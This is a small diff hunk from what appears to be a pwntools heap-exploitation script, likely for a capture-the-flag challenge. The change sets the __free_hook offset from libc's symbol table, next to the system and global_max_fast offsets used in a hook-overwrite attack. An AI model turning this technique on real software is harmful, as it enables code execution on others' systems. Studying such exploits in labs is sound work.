@@ -60,7 +60,7 @@ libc = ELF("./libc.so.6")
 
 libc_off = 0x3c4b78
 system_off = libc.symbols["system"]
-free_hook_off = 0x3c67a8
+free_hook_off = libc.symbols["__free_hook"]
 global_max_fast_off = 0x3c67f8
 
 def func_insert(content):
